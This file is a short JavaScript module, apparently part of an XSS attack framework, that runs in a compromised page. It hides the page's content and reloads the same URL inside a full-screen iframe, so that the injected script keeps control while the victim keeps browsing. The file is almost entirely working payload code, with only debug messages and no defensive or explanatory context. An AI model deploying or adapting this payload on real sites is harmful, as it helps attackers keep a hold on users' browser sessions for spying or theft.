// TODO: rewrite this to not need JQuery !

xss.dbg("frame_me");

xss.dbg("frame already injected?");
if (window.top!=window.self) {
	xss.dbg("already injected, done.");
} else {
	xss.dbg("injecting frame");

	$('body').children().hide();
	xss.dbg("body hidden");

	var ifr = $('<iframe>').css({
		 position: 'absolute',
		 width: '100%',
		 height: '100%',
		 top: 0,
		 left: 0,
		 border: 0,
		 background: '#fff',
		"z-index":10
	 }).attr('src', window.location.href).appendTo('body');

	xss.dbg("framed ("+window.location.href+")");
}
